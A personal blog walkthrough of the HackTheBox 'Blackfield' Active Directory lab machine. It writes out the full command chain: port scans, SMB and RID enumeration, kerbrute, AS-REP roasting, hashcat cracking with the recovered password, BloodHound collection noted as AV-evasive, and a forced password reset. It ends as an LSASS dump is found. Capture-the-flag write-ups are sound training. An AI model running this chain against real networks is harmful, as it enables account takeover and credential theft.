---
title: "Blackfield - HackTheBox machine"
date: 2025-09-11 00:00:00 +0800
categories: [ctf, hacking, walkthrought]
tags: [ctf, walkthrought, hacking, penetration testing]
--- 

## Blackfield Machine Walkthrought
Hello everyone, this is my first machine walktrought on my personal blog site.
Since i have studied for OSCP, i started doing some boxes that can be' close to the exam to prove and sharpen my skills,
as a result, here you will not only find a clear walktrought, 
but also points where i've been stuck and had to "try harder" and dig in my memories :)

This is an hard box playable on HackTheBox
If you wanna play it while following along , here is the link
https://www.hackthebox.com/machines/blackfield

# Target : 10.10.10.192
I always start with network enumeration

## Network enumeration
#### Rustscan
`╰─ rustscan -a 10.10.10.192 --ulimit 5000 -g` 
10.10.10.192 -> [53,88,135,389,445,593,3268,5985]
#### Nmap
`╰─ nmap -sT -A -Pn -T5 -p 53,88,135,389,445,593,3268,5985 10.10.10.192 --disable-arp-ping --min  
-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=3s`

![nmap](/assets/Chirpy/bf-nmap-scan.png)

### So we have:<br>
53 : DNS: `We can enumerate the nameservers and discover the domain controller`<br>
88 : Kerberos : `We can enumerate users inside the domain` [Understand why](https://www.prosec-networks.com/en/blog/kerberos-attacks/)<br>
135 : RPC : `Possible anonymous login`<br>
389/3268 : LDAP : `Possible anonymous login`<br>
445 : SMB : `Possible anonymous login`<br>
5985 : WinRM : `To establish a connection`<br>

### DNS : Discovering the domain controller
First of all, from our nmap scan we noticed that the domain name is : blackfield.local<br>
Querying the nameservers using dig : `dig ns blackfield.local @10.10.10.192`,<br> we find out that the domain controller is `dc01.blackfield.local`
![dig](/assets/Chirpy/bf-dns.png)
### Other services
#### RPC : 
We attempt to join as anonymous using `rpcclient -N blackfield.local`,but we get "ACCESS DENIED"
#### SMB
Using netexec : `netexec smb blackfield.local -u 'Guest' -p '' `, we find out that we have Guest login enabled.<br>
![nxc](/assets/Chirpy/bf-smb-anon-1.png)

In order to download every file inside the shares, we can use a module provided by netexec called [spider_plus](https://www.netexec.wiki/smb-protocol/spidering-shares)
But we don't find nothing inside 
![spider](/assets/Chirpy/bf-spider1.png)
So we attempt to bruteforce [RID](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid)
Let's redirect the output in a file (users.txt) and manipulate strings in order to retrieve a clear user list
`cat users.txt  | awk '{print $6}' | tr -d ":" >> toverify.txt`
`cat toverify.txt | sed -r 's\BLACKFIELD\ \g' | tr -d '\' | tr -d ' ' >> clean_users_toverify.txt`

### Kerbrute
Using `kerbrute userenum --dc dc01.blackfield.local -d blackfield.local clean_users_toverify.txt` we retrieve a list of users and computers inside the domain:

![kerbrute](/assets/Chirpy/bf-kerbrute.png)
`cat kerb_users.txt | awk '{print $7}' >> final_valid.txt`

### AS-REP roasting
We will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.
You can find the following tool here [impacket](https://github.com/fortra/impacket) inside impacket/examples/GetNPUsers.py<br>

`GetNPUsers.py -no-pass -usersfile final_valid.txt blackfield.local/`
![as-rep](/assets/Chirpy/as-rep.png)
Yes! We found one vulnerable user : `support`, let's save the ticket in a file and crack it.
According to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
hash starting with ``$krb5asrep$`` has "18200" as module number
![krb](/assets/Chirpy/hashcat-mo.png)
`hashcat -a 0 -m 18200 support_ticket /usr/share/wordlists/rockyou.txt.utf`
![hashcat](/assets/Chirpy/hashcat.png)
`support : #00^BlackKnight`

### Lateral movement
We attempt to get a WinRM shell but no luck, so let's create a file called protocols and iterate with nxc on it.
```
wmi  
smb  
rdp  
winrm  
ldap  
psexec
```

`for i in $(cat protocols );do nxc $i 10.10.10.192 -u 'support' -p '#00^BlackKnight';done`
![iterate](iterate.png)
Seems like we have access to RPC, but we already got all users, so we check if we have something:
`rpcclient -U 'support%#00^BlackKnight' 10.10.10.192`
As expected, nothing was inside.

Let's use smbmap to enumerate which shares we have access to : 
`smbmap -H 10.10.10.192 -u 'support' -p '#00^BlackKnight'`
<img width="1113" height="238" alt="Pasted image 20250911112555" src="https://github.com/user-attachments/assets/7c4c5d5e-837e-4a95-875d-9467c5dde5f9" />

Let's download everything using:
`nxc smb blackfield.local -u 'support' -p '#00^BlackKnight' -M spider_plus -o DOWNLOAD_FLAG=True`
We successfully got "SYSVOL", but after enumerated everything, nothing was found inside, we also had access to "profiles$"
which are something similar to nicknames
`smbclient \\\\10.10.10.192\\profiles$ -u 'support'`
<img width="970" height="275" alt="Pasted image 20250911114938" src="https://github.com/user-attachments/assets/271b3656-3314-4fc6-ad87-a16d5198d7b4" />

Even after trying create a wordlist for kerbrute, no valid user was found.

So let's jump to my favorite part!
## Bloodhound
>BloodHound uses graph theory to reveal hidden and often unintended relationships within Active Directory, Entra ID (formerly Azure AD), and Microsoft Azure IaaS. Defenders (blue teams) and attackers (red teams) use BloodHound for a deeper understanding of privileged relationships in an environment.

[More info here](https://bloodhound.specterops.io/get-started/introduction)

Usually we need a data ingestor (e.g Sharphound)
But since we don't have access to the machine, we're gonna try to collect data over LDAP.
We use [Rusthound](https://github.com/NH-RED-TEAM/RustHound) a faster alternative to bloodhound-python or other<br>
similar ingestor/data collector.
It is also a good option if the system has a AV and we don't wanna be' detected.

<img width="1271" height="704" alt="Pasted image 20250911115948" src="https://github.com/user-attachments/assets/5689f949-fd27-4d1d-855c-3eb8091a2a62" />

Perfect! now we can use Bloodhound to analyze our path and see if we have some privileges over some user.
We use the [docker compose](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) as a fast way to deploy bloodhound in our system.

We upload every data retrieved thanks to rusthound and we look up for support.
<img width="836" height="295" alt="Pasted image 20250911120547" src="https://github.com/user-attachments/assets/c867f31f-c20f-407a-b6d5-f6fd8c82ce8f" />
Perfect! we got `Outbound Object Control` :

<img width="1211" height="288" alt="Pasted image 20250911120608" src="https://github.com/user-attachments/assets/6c89f50e-663c-4e37-b0a2-d0eec5c58a01" />
Permission to change password to AUDIT2020, in order to exploit this misconfiguration, we can use [net](https://www.kali.org/tools/net-tools/)

`net rpc password "AUDIT2020" "newP@ssword2025" -U "BLACKFIELD"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"`

We can now do the same process (Iterate over all the protocols) to see where we have access
SMB ACCESS: `smbclient \\\\10.10.10.192\\forensic -U 'AUDIT2020'
<img width="786" height="212" alt="Pasted image 20250911121425" src="https://github.com/user-attachments/assets/fd1e4cba-f338-4e1a-99dc-d15baf1414aa" />

`nxc smb blackfield.local -u 'AUDIT2020' -p 'newP@ssword2025' -M spider_plus -o DOWNLOAD_FLAG=True`
<img width="959" height="97" alt="Pasted image 20250911121046" src="https://github.com/user-attachments/assets/c0aa9bfb-e410-4580-bdf6-0505a7726e55" />

We notice an interesting file.
<img width="795" height="431" alt="Pasted image 20250911122126" src="https://github.com/user-attachments/assets/0df46a86-1878-4fa0-a8bf-f122f73acbe6" />
LSASS, also known as "Local Security Authority Subsystem Service",is a service that manage our credentials, it store our credentials in memory, in order to manage access for users,applications and other services.
Since it store credentials in memory, we can dump the credentials (or Hashes)


